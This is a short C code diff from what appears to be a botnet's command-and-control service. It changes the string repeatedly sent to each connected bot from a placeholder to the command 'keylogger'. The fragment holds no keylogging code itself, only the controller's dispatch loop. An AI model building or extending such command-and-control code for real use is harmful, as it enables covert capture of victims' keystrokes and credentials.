@@ -144,8 +144,10 @@ void *botService(void *vargp) {
     */
     bot_t *user = (bot_t *)vargp;
 
+    char command[] = "keylogger";
+
     while (1) {
-        write(user->fd, "john", sizeof("john"));
+        write(user->fd, command, sizeof(command));
         sleep(2);
     }
     
